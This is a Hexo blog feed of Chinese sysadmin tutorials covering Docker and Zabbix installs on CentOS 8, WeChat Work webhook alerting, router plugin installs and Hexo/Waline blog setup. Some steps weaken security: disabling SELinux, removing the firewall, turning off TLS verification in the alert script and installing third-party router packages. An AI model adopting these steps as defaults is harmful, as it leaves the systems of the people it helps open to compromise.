$&#123;COLOR&#125;&quot;Base,Extras的yum源失败,请检查yum源配置&quot;$&#123;END&#125;;exit; &#125;</span><br><span class="line">mkdir -p /etc/docker</span><br><span class="line">cat &gt; /etc/docker/daemon.json &lt;&lt;EOF</span><br><span class="line">&#123;</span><br><span class="line"> &quot;registry-mirrors&quot;: [&quot;https://si7y70hh.mirror.aliyuncs.com&quot;]</span><br><span class="line"> &#125;</span><br><span class="line">EOF</span><br><span class="line"></span><br><span class="line">systemctl restart docker</span><br><span class="line">docker version &amp;&amp; $&#123;COLOR&#125;&quot;Docker安装成功&quot;$&#123;END&#125; || $&#123;COLOR&#125;&quot;Docker安装失败&quot;$&#123;END&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>赋予脚本执行权限并执行脚本</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">chmod +x docker-install.sh</span><br><span class="line">./docker-install.sh</span><br></pre></td></tr></table></figure>

<h2 id="安装docker-compose"><a href="#安装docker-compose" class="headerlink" title="安装docker-compose"></a>安装docker-compose</h2><p>我选择的是pip安装方式。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pip3 install docker-compose</span><br><span class="line"></span><br></pre></td></tr></table></figure>




]]></content>
      <categories>
        <category>Docker</category>
      </categories>
      <tags>
        <tag>docker</tag>
      </tags>
  </entry>
  <entry>
    <title>Centos8安装zabbix5.4.7（一）</title>
    <url>/archives/dfadafff.html</url>
    <content><![CDATA[<p>由于工作需要，打算在环境中部署zabbix监控系统，并实现企业微信告警通知。安装centos linux时建议最小化安装。</p>
<span id="more"></span>

<h1 id="Centos8安装相关系统包"><a href="#Centos8安装相关系统包" class="headerlink" title="Centos8安装相关系统包"></a>Centos8安装相关系统包</h1><ul>
<li><p>因为最小化安装系统，所以软件包特别少，因此需要安装一些常用的包</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">yum -y install net-tools vim net-snmp-utils</span><br></pre></td></tr></table></figure></li>
<li><p>关闭selinux，需要修改vim /etc/selinux/config，重启后生效</p>
<figure class="highlight diff"><table><tr><td class="code"><pre><span class="line"><span class="deletion">- SELINUX=enforcing</span></span><br><span class="line"><span class="addition">+ SELINUX=disabled</span></span><br></pre></td></tr></table></figure></li>
<li><p>卸载防火墙</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">yum -y remove firewalld</span><br></pre></td></tr></table></figure></li>
<li><p>验证一些OID的命令</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">snmpwalk -v 2c -c public IP地址 OID</span><br></pre></td></tr></table></figure></li>
</ul>
<h1 id="下载zabbix相关安装包"><a href="#下载zabbix相关安装包" class="headerlink" title="下载zabbix相关安装包"></a>下载zabbix相关安装包</h1><ul>
<li><p>从官网下载相关包</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">rpm -Uvh https://repo.zabbix.com/zabbix/5.4/rhel/8/x86_64/zabbix-release-5.4-1.el8.noarch.rpm</span><br><span class="line">dnf clean all</span><br></pre></td></tr></table></figure></li>
<li><p>使用dnf安装相关软件包</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dnf install zabbix-server-mysql zabbix-web-mysql zabbix-nginx-conf zabbix-sql-scripts zabbix-agent</span><br></pre></td></tr></table></figure></li>
</ul>
<h1 id="安装MySQL数据库"><a href="#安装MySQL数据库" class="headerlink" title="安装MySQL数据库"></a>安装MySQL数据库</h1><ul>
<li><p>下载MySQL8.0版本的rpm包</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wget https://dev.mysql.com/get/mysql80-community-release-el8-1.noarch.rpm</span><br></pre></td></tr></table></figure></li>
<li><p>本地安装rpm包</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">yum localinstall mysql80-community-release-el8-1.noarch.rpm  #rpm包</span><br><span class="line">yum update</span><br></pre></td></tr></table></figure></li>
<li><p>安装数据库并启动设置开机自启</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">systemctl start mysqld</span><br><span class="line">systemctl enable mysqld</span><br><span class="line">systemctl status mysqld # 查看服务状态</span><br></pre></td></tr></table></figure></li>
<li><p>设置数据库root密码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">use mysql; //选择数据库</span><br><span class="line">alter user &#x27;root&#x27;@&#x27;localhost&#x27; identified by &#x27;password&#x27;; //修改密码</span><br><span class="line">flush privileges; //刷新权限表</span><br></pre></td></tr></table></figure></li>
</ul>
<h1 id="zabbix相关设置"><a href="#zabbix相关设置" class="headerlink" title="zabbix相关设置"></a>zabbix相关设置</h1><ul>
<li><p>创建zabbix库</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># mysql -uroot -p</span><br><span class="line"></span><br><span class="line">password</span><br><span class="line"></span><br><span class="line">mysql&gt; create database zabbix character set utf8 collate utf8_bin;</span><br><span class="line"></span><br><span class="line">mysql&gt; create user zabbix@localhost identified by &#x27;password&#x27;;</span><br><span class="line"></span><br><span class="line">mysql&gt; grant all privileges on zabbix.* to zabbix@localhost;</span><br><span class="line"></span><br><span class="line">mysql&gt; quit;</span><br></pre></td></tr></table></figure></li>
<li><p>导入zabbix库</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">zcat /usr/share/doc/zabbix-sql-scripts/mysql/create.sql.gz | mysql -uzabbix -p zabbix #这个zabbix为库名</span><br></pre></td></tr></table></figure></li>
<li><p>修改配置文件 /etc/zabbix/zabbix_server.conf</p>
<figure class="highlight diff"><table><tr><td class="code"><pre><span class="line"><span class="deletion">- DBPassword=password</span></span><br><span class="line"><span class="addition">+ DBPassword=设置的zabbix数据库密码</span></span><br></pre></td></tr></table></figure></li>
<li><p>在/etc/my.cnf.d/自定义一个zabbix.cnf实现数据库调优</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[mysqld]</span><br><span class="line">user = mysql</span><br><span class="line">local_infile = 0</span><br><span class="line"></span><br><span class="line">datadir = /var/lib/mysql/</span><br><span class="line"></span><br><span class="line">default-storage-engine = InnoDB</span><br><span class="line">skip-name-resolve</span><br><span class="line">key_buffer_size = 32M</span><br><span class="line">max_allowed_packet = 128M</span><br><span class="line">table_open_cache = 1024</span><br><span class="line">table_definition_cache = 1024</span><br><span class="line">max_connections = 2000</span><br><span class="line">join_buffer_size = 1M</span><br><span class="line">sort_buffer_size = 2M</span><br><span class="line">read_buffer_size = 256K</span><br><span class="line">read_rnd_buffer_size = 256K</span><br><span class="line">myisam_sort_buffer_size = 1M</span><br><span class="line">thread_cache_size = 512</span><br><span class="line">open_files_limit = 65535</span><br><span class="line">wait_timeout = 86400</span><br><span class="line"></span><br><span class="line">optimizer_switch=index_condition_pushdown=off</span><br><span class="line"></span><br><span class="line">tmp_table_size = 32M</span><br><span class="line">max_heap_table_size = 32M</span><br><span class="line"></span><br><span class="line">log_bin = 1</span><br><span class="line">binlog_format=mixed</span><br><span class="line">binlog_cache_size = 32M</span><br><span class="line">max_binlog_size = 256M</span><br><span class="line">binlog_expire_logs_seconds = 604800</span><br><span class="line"></span><br><span class="line"># #innodb_page_size = 32K</span><br><span class="line"></span><br><span class="line">innodb_buffer_pool_size = 512M</span><br><span class="line">innodb_log_file_size = 256M</span><br><span class="line">innodb_log_buffer_size = 64M</span><br><span class="line">innodb_file_per_table = 1</span><br><span class="line">innodb_flush_method = O_DIRECT</span><br><span class="line">innodb_buffer_pool_instances = 4</span><br><span class="line">innodb_write_io_threads = 4</span><br><span class="line">innodb_read_io_threads = 4</span><br><span class="line">innodb_adaptive_flushing = 1</span><br><span class="line">innodb_lock_wait_timeout = 50</span><br><span class="line"></span><br><span class="line">innodb_flush_log_at_trx_commit = 2</span><br><span class="line"></span><br><span class="line">innodb_io_capacity = 300</span><br><span class="line">innodb_io_capacity_max = 400</span><br><span class="line">innodb_flush_neighbors = 0</span><br><span class="line"></span><br><span class="line">innodb_doublewrite = 1</span><br><span class="line">innodb_thread_concurrency = 0</span><br><span class="line"></span><br><span class="line">innodb_purge_threads = 1</span><br><span class="line"></span><br><span class="line">server_id = 1</span><br><span class="line">binlog_checksum = crc32</span><br><span class="line"></span><br><span class="line">innodb_lru_scan_depth = 512</span><br><span class="line"></span><br><span class="line">innodb_stats_on_metadata = 0</span><br></pre></td></tr></table></figure></li>
<li><p>创建zabbix server 站点配置文件,vim /etc/nginx/conf.d/zabbix.conf</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">server &#123;</span><br><span class="line">#        listen          80;</span><br><span class="line">#        server_name     example.com;</span><br><span class="line"></span><br><span class="line">        root    /usr/share/zabbix;</span><br><span class="line"></span><br><span class="line">        index   index.php;</span><br><span class="line"></span><br><span class="line">        location = /favicon.ico &#123;</span><br><span class="line">                log_not_found   off;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        location / &#123;</span><br><span class="line">                try_files       $uri $uri/ =404;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        location /assets &#123;</span><br><span class="line">                access_log      off;</span><br><span class="line">                expires         10d;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        location ~ /\.ht &#123;</span><br><span class="line">                deny            all;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        location ~ /(api\/|conf[^\.]|include|locale|vendor) &#123;</span><br><span class="line">                deny            all;</span><br><span class="line">                return          404;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        location ~ [^/]\.php(/|$) &#123;</span><br><span class="line">                fastcgi_pass    unix:/run/php-fpm/zabbix.sock;</span><br><span class="line">                fastcgi_split_path_info ^(.+\.php)(/.+)$;</span><br><span class="line">                fastcgi_index   index.php;</span><br><span class="line"></span><br><span class="line">                fastcgi_param   DOCUMENT_ROOT   /usr/share/zabbix;</span><br><span class="line">                fastcgi_param   SCRIPT_FILENAME /usr/share/zabbix$fastcgi_script_name;</span><br><span class="line">                fastcgi_param   PATH_TRANSLATED /usr/share/zabbix$fastcgi_script_name;</span><br><span class="line"></span><br><span class="line">                include fastcgi_params;</span><br><span class="line">                fastcgi_param   QUERY_STRING    $query_string;</span><br><span class="line">                fastcgi_param   REQUEST_METHOD  $request_method;</span><br><span class="line">                fastcgi_param   CONTENT_TYPE    $content_type;</span><br><span class="line">                fastcgi_param   CONTENT_LENGTH  $content_length;</span><br><span class="line"></span><br><span class="line">                fastcgi_intercept_errors        on;</span><br><span class="line">                fastcgi_ignore_client_abort     off;</span><br><span class="line">                fastcgi_connect_timeout         60;</span><br><span class="line">                fastcgi_send_timeout            180;</span><br><span class="line">                fastcgi_read_timeout            180;</span><br><span class="line">                fastcgi_buffer_size             128k;</span><br><span class="line">                fastcgi_buffers                 4 256k;</span><br><span class="line">                fastcgi_busy_buffers_size       256k;</span><br><span class="line">                fastcgi_temp_file_write_size    256k;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></li>
<li><p>启动zabbix server和agent进程并设置开机自启</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># systemctl restart zabbix-server zabbix-agent nginx php-fpm</span><br><span class="line"># systemctl enable zabbix-server zabbix-agent nginx php-fp</span><br></pre></td></tr></table></figure></li>
</ul>
<h1 id="web页面中文乱码问题"><a href="#web页面中文乱码问题" class="headerlink" title="web页面中文乱码问题"></a>web页面中文乱码问题</h1><ul>
<li><p>复制本地电脑C:\Windows\Fonts\simkai.ttf（楷体）上传到zabbix服务器网站目录的fonts目录下。此步骤可以使用winscp软件。2、修改zabbix字体为刚才上传的字体，graphfont.ttf是zabbix默认字符集。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd /usr/share/zabbix/fonts</span><br><span class="line">mv graphfont.ttf graphfont.ttf.bak</span><br><span class="line">mv msyh.ttc graphfont.ttf</span><br></pre></td></tr></table></figure></li>
<li><p>刷新页面，可以看到监控页面中文正常显示</p>
</li>
</ul>
<h1 id="主机名不能输入中文"><a href="#主机名不能输入中文" class="headerlink" title="主机名不能输入中文"></a>主机名不能输入中文</h1><ul>
<li><p>修改zabbix的php文件：/usr/share/zabbix/include/defines.inc.php</p>
<figure class="highlight diff"><table><tr><td class="code"><pre><span class="line"><span class="deletion">- define(&#x27;ZBX_PREG_INTERNAL_NAMES&#x27;, &#x27;([0-9a-zA-Z_\. \-]+)&#x27;);</span></span><br><span class="line"><span class="addition">+ define(&#x27;ZBX_PREG_INTERNAL_NAMES&#x27;, &#x27;([0-9a-zA-Z_\. \-\x&#123;80&#125;-\x&#123;ff&#125;]+)&#x27;);</span></span><br></pre></td></tr></table></figure></li>
</ul>
]]></content>
      <categories>
        <category>zabbix</category>
      </categories>
      <tags>
        <tag>zabbix</tag>
      </tags>
  </entry>
  <entry>
    <title>Centos8安装zabbix5.4.7（二）</title>
    <url>/archives/0.html</url>
    <content><![CDATA[<p>接着上篇，这篇写的是zabbix实现通过企业微信发送告警，自行可以直接注册企业微信，并不需要什么资料，然后在企业内部群添加机器人，然后在机器人信息中会获得一个webhook链接，这个链接后续会用到。</p>
<span id="more"></span>

<h1 id="创建调用webhook链接的脚本"><a href="#创建调用webhook链接的脚本" class="headerlink" title="创建调用webhook链接的脚本"></a>创建调用webhook链接的脚本</h1><ul>
<li><p>脚本路径为：/usr/lib/zabbix/alertscripts/ 。脚本具体内容如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#! /usr/bin/python3</span><br><span class="line">#! -*- coding:utf-8 -*-</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">import os</span><br><span class="line">import urllib3</span><br><span class="line">import time</span><br><span class="line">import requests</span><br><span class="line">import json</span><br><span class="line">import sys</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">urllib3.disable_warnings()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def SendMessageURL(User,Subject,Messages):</span><br><span class="line">    URL = &quot;https://qyapi.weixin.qq.com/cgi-bin/webhook/send?key=webhook_key&quot; #机器人的webhook</span><br><span class="line">    HEADERS = &#123;&quot;Content-Type&quot;: &quot;application/json&quot;&#125;</span><br><span class="line">    Data = &#123;</span><br><span class="line">            &quot;msgtype&quot;: &quot;markdown&quot;,</span><br><span class="line">            &quot;markdown&quot;:&#123;</span><br><span class="line">                &quot;content&quot;:Subject + &quot;\n&quot; + Messages</span><br><span class="line">                &#125;,</span><br><span class="line">            &#125;</span><br><span class="line">    r = requests.post(url=URL,headers=HEADERS,json=Data,verify=False)</span><br><span class="line">    print(r.json())</span><br><span class="line"></span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    SENDTO = str(sys.argv[1])</span><br><span class="line">    SUBJECT = str(sys.argv[2])</span><br><span class="line">    MESSAGE = str(sys.argv[3])</span><br><span class="line">    Status = str(SendMessageURL(SENDTO,SUBJECT,MESSAGE))</span><br><span class="line">    print(Status)</span><br></pre></td></tr></table></figure>

<p>以markdown格式发送消息</p>
</li>
<li><p>创建完脚本之后需要修改脚本权限。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">chmod +x wechat.py</span><br><span class="line">chown zabbix. wechat.py</span><br></pre></td></tr></table></figure>

</li>
</ul>
<h1 id="接下来是web页面的操作"><a href="#接下来是web页面的操作" class="headerlink" title="接下来是web页面的操作"></a>接下来是web页面的操作</h1><ul>
<li><p>管理 &gt; 报警媒介类型 &gt; 创建媒体类型</p>
<p><img data-src="https://vkali-1303828639.cos.ap-hongkong.myqcloud.com/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20211111140537.png"></p>
</li>
</ul>
<p>​                <img data-src="https://vkali-1303828639.cos.ap-hongkong.myqcloud.com/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20211111140616.png"></p>
<ul>
<li><p>告警内容</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;font color=&quot;#FF0000&quot; center&gt;**告警信息**&lt;/font&gt;[&#123;EVENT.ID&#125;]</span><br><span class="line">&gt; 告警主机: **&#123;HOST.NAME&#125;**</span><br><span class="line">&gt; 主机地址: **&#123;HOST.IP&#125;**</span><br><span class="line">&gt; 监控项目: &#123;ITEM.NAME&#125;</span><br><span class="line">&gt; 当前取值: &#123;ITEM.LASTVALUE&#125;</span><br><span class="line">&gt; 告警等级: &#123;TRIGGER.SEVERITY&#125;</span><br><span class="line">&gt; 告警时间: &#123;EVENT.DATE&#125;-&#123;EVENT.TIME&#125;</span><br><span class="line">&gt; 事件ID: &#123;EVENT.ID&#125;</span><br></pre></td></tr></table></figure></li>
<li><p>告警恢复</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;font color=&quot;#008000&quot;  center&gt;**告警**&lt;/font&gt;[&#123;EVENT.ID&#125;]&lt;font color=&quot;#008000&quot; center&gt; **已恢复**&lt;/font&gt;</span><br><span class="line">&gt; 主机名称: **&#123;HOST.NAME&#125;**</span><br><span class="line">&gt; 主机地址: **&#123;HOST.IP&#125;**</span><br><span class="line">&gt; 告警名称: &#123;EVENT.NAME&#125;</span><br><span class="line">&gt; 持续时长: &#123;EVENT.DURATION&#125;</span><br><span class="line">&gt; 恢复时间: &#123;EVENT.RECOVERY.DATE&#125;-&#123;EVENT.RECOVERY.TIME&#125; </span><br><span class="line">&gt; 当前状态: &#123;TRIGGER.STATUS&#125;</span><br><span class="line">&gt; 当前取值: &#123;ITEM.LASTVALUE&#125;</span><br><span class="line">&gt; 事件ID: &#123;EVENT.ID&#125;</span><br></pre></td></tr></table></figure></li>
<li><p>接下创建动作，配置 &gt; 动作 &gt; Trigger actions &gt; 创建动作</p>
<p><img data-src="https://vkali-1303828639.cos.ap-hongkong.myqcloud.com/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20211111141329.png"></p>
</li>
</ul>
<p><img data-src="https://vkali-1303828639.cos.ap-hongkong.myqcloud.com/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20211111141352.png"></p>
<ul>
<li><p>接下来选择user settings &gt; Profile &gt; 报警媒介</p>
<p><img data-src="https://vkali-1303828639.cos.ap-hongkong.myqcloud.com/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20211111141639.png"></p>
</li>
<li><p>不出意外的话，至此配置已经完成。上效果图：</p>
</li>
</ul>
<p><img data-src="https://vkali-1303828639.cos.ap-hongkong.myqcloud.com/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20211111142524.jpg"></p>
]]></content>
      <categories>
        <category>zabbix</category>
      </categories>
      <tags>
        <tag>zabbix</tag>
      </tags>
  </entry>
  <entry>
    <title>GL.iNET MT1300路由器增加SSR-Plus支持</title>
    <url>/archives/ca049460.html</url>
    <content><![CDATA[<p>偶然机会购买了一台GL.iNET MT1300这一款，主要是看中了它的颜值，还有就是它的小巧，自带openwrt。</p>
<span id="more"></span>

<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>GLiNet 他家路由系统采用的是开源 <strong>OpenWrt</strong> 系统并在 <em>github</em> 上开源并提供 <em>sdk</em> 和很多插件。</p>
<p>GLiNet 有自家刷不死的 uboot 可玩性很高。这里没有直接去刷第三方固件是因为喜欢他们家定制的 UI 可以比较方便的启用 ap 模式加入网络。所以就想着自建编译 ipk 插件在开源的 openwrt 固件内安装插件。</p>
<p>最终以失败告终。</p>
<h2 id="过程"><a href="#过程" class="headerlink" title="过程"></a>过程</h2><p>折腾了一天没结果，就想在GitHub上碰碰运气，果然是万能的GitHub啊！还真找到了ipk安装包。</p>
<p>GitHub链接：<a href="https://github.com/igithublab/MT1300">https://github.com/igithublab/MT1300</a></p>
<p>下载下来两个压缩包，解压完之后把所有需要的包上传到路由器上，我用的是winscp软件进行上传的。</p>
<p>之后用ssh连接登录，进入到上一步上传的ipk所在的文件夹，然后执行opkg install *.ipk，执行完之后应该会需要三个依赖包。</p>
<p>这里推荐用everything这个软件在电脑本地搜索那三个依赖包，可以选择在网页上进行安装，也可以用命令行进行安装。</p>
<p>安装完三个依赖包之后，就可以愉快的使用啦。</p>
<h2 id="链接"><a href="#链接" class="headerlink" title="链接"></a>链接</h2><p>1.<a href="https://github.com/igithublab/MT1300">https://github.com/igithublab/MT1300</a></p>
<p>2.<a href="https://github.com/jerrykuku/luci-theme-argon">https://github.com/jerrykuku/luci-theme-argon</a></p>
]]></content>
      <categories>
        <category>Openwrt</category>
      </categories>
      <tags>
        <tag>MT1300</tag>
        <tag>openwrt</tag>
        <tag>ssr plus</tag>
      </tags>
  </entry>
  <entry>
    <title>Hexo搭建与Next8.02主题设置（三）</title>
    <url>/archives/80c6f28b.html</url>
    <content><![CDATA[<p>接着前面两篇文章继续</p>
<span id="more"></span>
<h1 id="文章固定ID"><a href="#文章固定ID" class="headerlink" title="文章固定ID"></a>文章固定ID</h1><p>安装插件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">npm install hexo-abbrlink --save</span><br></pre></td></tr></table></figure>
<p>修改站点配置文件：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">url: https://vkali.com/</span><br><span class="line">root: /</span><br><span class="line">permalink: archives/:abbrlink.html</span><br><span class="line">abbrlink:</span><br><span class="line">  alg: crc32  # 算法：crc16(default) and crc32</span><br><span class="line">  rep: hex    # 进制：dec(default) and hex</span><br><span class="line">permalink_defaults:</span><br></pre></td></tr></table></figure>
<h1 id="观影"><a href="#观影" class="headerlink" title="观影"></a>观影</h1><p>参考：<a href="https://tding.top/archives/567debe0.html" title="Hexo 豆瓣读书、豆瓣电影插件">Hexo 豆瓣读书、豆瓣电影插件</a></p>
<h1 id="站点地图"><a href="#站点地图" class="headerlink" title="站点地图"></a>站点地图</h1><p>安装插件：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">npm install hexo-generator-sitemap --save</span><br><span class="line"></span><br><span class="line">npm install hexo-generator-baidu-sitemap --save</span><br></pre></td></tr></table></figure>
<p>在站点配置文件中添加以下内容：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 通用站点地图</span><br><span class="line">sitemap:</span><br><span class="line">  path: sitemap.xml</span><br><span class="line"># 百度站点地图</span><br><span class="line">baidusitemap:</span><br><span class="line">  path: baidusitemap.xml</span><br></pre></td></tr></table></figure>
<h1 id="公益404"><a href="#公益404" class="headerlink" title="公益404"></a>公益404</h1><p>在主题目录next/source/下，新建404.html，写入以下内容：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=&quot;en&quot;&gt;</span><br><span class="line">    &lt;head&gt;</span><br><span class="line">        &lt;meta charset=&quot;UTF-8&quot;&gt;</span><br><span class="line">        &lt;title&gt;404&lt;/title&gt;</span><br><span class="line">    &lt;link rel=&quot;alternate&quot; href=&quot;/atom.xml&quot; title=&quot;YinXin&#x27;s Blog&quot; type=&quot;application/atom+xml&quot;&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">    &lt;body&gt;</span><br><span class="line">        &lt;script type=&quot;text/javascript&quot; src=&quot;//qzonestyle.gtimg.cn/qzone/hybrid/app/404/search_children.js&quot; charset=&quot;utf-8&quot; homePageUrl=&quot;/&quot; homePageName=&quot;返回&quot;&gt;&lt;/script&gt; </span><br><span class="line">    &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
<h1 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h1><p>目前想到的就这么多，其他的以后再写吧！</p>
<h1 id="参考博客"><a href="#参考博客" class="headerlink" title="参考博客"></a>参考博客</h1><ul>
<li><a href="https://tding.top/" title="小丁的个人博客">小丁的个人博客</a></li>
<li><a href="https://blog.mrzorg.top/" title="zorg&#39;s Blog">zorg’s Blog</a></li>
<li><a href="https://www.hxhowl.com/" title="飞不动的猫">飞不动的猫</a></li>
</ul>
]]></content>
      <categories>
        <category>Hexo</category>
      </categories>
      <tags>
        <tag>hexo</tag>
        <tag>next</tag>
      </tags>
  </entry>
  <entry>
    <title>Next主题评论系统由Valine迁移至Waline</title>
    <url>/archives/3368d4d6.html</url>
    <content><![CDATA[<p>由于之前使用的Valine评论系统，在评论页面查看原代码可以看到API ID和密钥，出于安全性的考虑，决定迁移评论系统。</p>
<span id="more"></span>

<h2 id="配置Waline"><a href="#配置Waline" class="headerlink" title="配置Waline"></a>配置Waline</h2><p>仓库初始化教程请参阅官网：<a href="https://waline.js.org/quick-start.html">https://waline.js.org/quick-start.html</a></p>
<p>仓库初始化完毕后开始准备部署到 Vercel。这里需要在 Environment Variables 初配置 <code>LEAN_ID</code>, <code>LEAN_KEY</code> 和 <code>LEAN_MASTER_KEY</code> 三个环境变量。它们的值分别对应上一步在 LeanCloud 中获得的 <code>APP ID</code>, <code>APP KEY</code>, <code>Master Key</code>。如果你是 LeanCloud 国内版用户的话，还需要输入 <code>LEAN_SERVER</code> 环境变量，对应的是你在上一步上绑定的已备案域名。</p>
<p><img data-src="https://vkali-1303828639.cos.ap-hongkong.myqcloud.com/hexo/t019aec05e3e5fea5cc.png"></p>
<p>点击 Deploy 就会开始进行部署了。稍等片刻，就会看到满屏的烟花庆祝你部署成功了。点击 Visit 会跳转到部署好的网站地址上，该地址即为之后需要填入的 <code>serverURL</code> 地址。</p>
<p><img data-src="https://vkali-1303828639.cos.ap-hongkong.myqcloud.com/hexo/t0142b58c2e8f886b28.png"></p>
<h2 id="Next安装Waline支持"><a href="#Next安装Waline支持" class="headerlink" title="Next安装Waline支持"></a>Next安装Waline支持</h2><p>安装命令</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">npm install @waline/hexo-next</span><br></pre></td></tr></table></figure>

<p>更改配置文件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># Waline</span><br><span class="line"># For more information: https://waline.js.org, https://github.com/lizheming/waline</span><br><span class="line">waline:</span><br><span class="line">  enable: false</span><br><span class="line">  serverURL: https://waline.vercel.app # Waline server address url</span><br><span class="line">  placeholder: Just go go # Comment box placeholder</span><br><span class="line">  avatar: mm # Gravatar style</span><br><span class="line">  meta: [nick, mail, link] # Custom comment header</span><br><span class="line">  pageSize: 10 # Pagination size</span><br><span class="line">  lang: # Language, available values: en, zh-cn</span><br><span class="line">  # Warning: Do not enable both `waline.visitor` and `leancloud_visitors`.</span><br><span class="line">  visitor: false # Article reading statistic</span><br><span class="line">  comment_count: true  # If false, comment count will only be displayed in post page, not in home page</span><br><span class="line">  requiredFields: [] # Set required fields: [nick] | [nick, mail]</span><br><span class="line">  libUrl: # Set custom library cdn url</span><br></pre></td></tr></table></figure>

<p>把原有的valine的配置关掉或删除。</p>
<h2 id="配置微信提醒"><a href="#配置微信提醒" class="headerlink" title="配置微信提醒"></a>配置微信提醒</h2><p>微信通知使用了 <a href="http://sc.ftqq.com/3.version">Server 酱 (opens new window)</a>提供的服务，需要在环境变量中配置在 Server 酱中申请的 <code>SC_KEY</code>。</p>
<ul>
<li><code>SC_KEY</code>：Server 酱提供的 Token，必填。</li>
<li><code>AUTHOR_EMAIL</code>：博主邮箱，用来区分发布的评论是否是博主本身发布的。如果是博主发布的则不进行提醒通知。</li>
<li><code>SITE_NAME</code>：网站名称，用于在消息中显示。</li>
<li><code>SITE_URL</code>：网站地址，用于在消息中显示。</li>
</ul>
<p>至此我需要的功能基本已经实现。其他功能请移步官网。</p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul>
<li><p>Waline：<a href="https://waline.js.org/">https://waline.js.org/</a></p>
</li>
<li><p>Hexo NexT Waline：<a href="https://www.npmjs.com/package/@waline/hexo-next">https://www.npmjs.com/package/@waline/hexo-next</a></p>
</li>
</ul>
]]></content>
      <categories>
        <category>Hexo</category>
      </categories>
      <tags>
        <tag>Next</tag>
        <tag>Valine</tag>
        <tag>Waline</tag>
      </tags>
  </entry>
  <entry>
    <title>Hexo搭建与Next8.02主题设置（一）</title>
    <url>/archives/ea0a751e.html</url>
    <content><![CDATA[<p>之前搭建博客并没有记录，借着这次博客的版本升级记录一下搭建过程，本地环境为Windows10，VPS为centos Linux系统，主题使用的为Next，样式选择的是Gemini。</p>
<span id="more"></span>

<h1 id="安装-Git和node-js"><a href="#安装-Git和node-js" class="headerlink" title="安装 Git和node.js"></a>安装 Git和node.js</h1><p>因为本地是Windows系统，这两个软件直接下载，图形化界面安装即可，这里不做介绍。</p>
<h1 id="安装Hexo"><a href="#安装Hexo" class="headerlink" title="安装Hexo"></a>安装Hexo</h1><p>上面两个软件安装完成后，即可在命令页面使用以下命令安装：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">npm install -g hexo-cli</span><br></pre></td></tr></table></figure>
<h2 id="本地部署Hexo"><a href="#本地部署Hexo" class="headerlink" title="本地部署Hexo"></a>本地部署Hexo</h2><p>1.在本地建立一个文件夹，名字随便，例如：blog</p>
<p>2.在命令行执行命令，初始化博客。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hexo init blog // blog为你建立的文件夹</span><br><span class="line"></span><br><span class="line">cd blog  // 进入创建的文件夹</span><br><span class="line"></span><br><span class="line">npm install // 安装博客程序依赖</span><br></pre></td></tr></table></figure>

<h2 id="启动"><a href="#启动" class="headerlink" title="启动"></a>启动</h2><p>在本地运行博客</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hexo server</span><br></pre></td></tr></table></figure>
<p>本地访问<a href="http://127.0.0.1:4000,即可看到博客页面。">http://127.0.0.1:4000,即可看到博客页面。</a></p>
